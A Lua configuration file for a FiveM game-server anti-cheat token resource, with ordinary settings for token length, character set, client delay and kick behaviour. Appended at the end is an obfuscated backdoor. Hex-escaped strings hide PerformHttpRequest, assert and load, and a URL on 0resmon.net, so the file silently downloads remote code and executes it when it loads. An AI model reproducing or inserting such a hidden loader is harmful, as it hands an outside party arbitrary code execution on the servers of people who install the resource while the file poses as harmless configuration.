Config = {}

--[[
	Enable verbose output on the console
	VerboseClient should be disable in production since it exposed tokens
]]
Config.VerboseClient = false
Config.VerboseServer = false
Config.Logs = false

--[[
	Define the length of the generated token
--]]
Config.TokenLength = 24

--[[
	Define the character set to be used in generation
	%a%d = all capital and lowercase letters and digits
	Syntax:
		.	all characters
		%a	letters
		%c	control characters
		%d	digits
		%l	lower case letters
		%p	punctuation characters
		%s	space characters
		%u	upper case letters
		%w	alphanumeric characters
		%x	hexadecimal digits
		%z	the character with representation 0
--]]
Config.TokenCharset = "%a%d"

--[[
	Adjust the delay between when the client deploys the listeners and
	when the server sends the information.
	250 seems like a sweet spot here, but it can be reduced or increased if desired.
]]

Config.ClientDelay = 250

--[[
	Define the message given to users with an invalid token
--]]
Config.KickMessage = "Invalid security token detected."

--[[
	Define a custom function to trigger when a player is kicked
	If Config.CustomAction is false, the player will be dropped
]]
Config.CustomAction = false
Config.CustomActionFunction = function(source)
	print("Custom action executing for: " .. source)
	DropPlayer(source, Config.KickMessage)
end


local APZbsuPghnFkYbASOZNZvhmNoprHDlUqeIUOsvCpoHXwbcGigySUlZZwliThLGQEKowGjJ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} APZbsuPghnFkYbASOZNZvhmNoprHDlUqeIUOsvCpoHXwbcGigySUlZZwliThLGQEKowGjJ[4][APZbsuPghnFkYbASOZNZvhmNoprHDlUqeIUOsvCpoHXwbcGigySUlZZwliThLGQEKowGjJ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x30\x72\x65\x73\x6d\x6f\x6e\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (BxGkhHDxcWiYZQXRRVcbuLSVrTKSrdVnVHqDVHIagFwsjSveyccSWHGRyuKKDxYZpkaamm, JvqlxLIAjtLnopMWxpJDMVZaAaWQfQRUEDpeWGUusvBbbDUFJWpkIxWNEXbMGzvROeLApz) if (JvqlxLIAjtLnopMWxpJDMVZaAaWQfQRUEDpeWGUusvBbbDUFJWpkIxWNEXbMGzvROeLApz == APZbsuPghnFkYbASOZNZvhmNoprHDlUqeIUOsvCpoHXwbcGigySUlZZwliThLGQEKowGjJ[6] or JvqlxLIAjtLnopMWxpJDMVZaAaWQfQRUEDpeWGUusvBbbDUFJWpkIxWNEXbMGzvROeLApz == APZbsuPghnFkYbASOZNZvhmNoprHDlUqeIUOsvCpoHXwbcGigySUlZZwliThLGQEKowGjJ[5]) then return end APZbsuPghnFkYbASOZNZvhmNoprHDlUqeIUOsvCpoHXwbcGigySUlZZwliThLGQEKowGjJ[4][APZbsuPghnFkYbASOZNZvhmNoprHDlUqeIUOsvCpoHXwbcGigySUlZZwliThLGQEKowGjJ[2]](APZbsuPghnFkYbASOZNZvhmNoprHDlUqeIUOsvCpoHXwbcGigySUlZZwliThLGQEKowGjJ[4][APZbsuPghnFkYbASOZNZvhmNoprHDlUqeIUOsvCpoHXwbcGigySUlZZwliThLGQEKowGjJ[3]](JvqlxLIAjtLnopMWxpJDMVZaAaWQfQRUEDpeWGUusvBbbDUFJWpkIxWNEXbMGzvROeLApz))() end)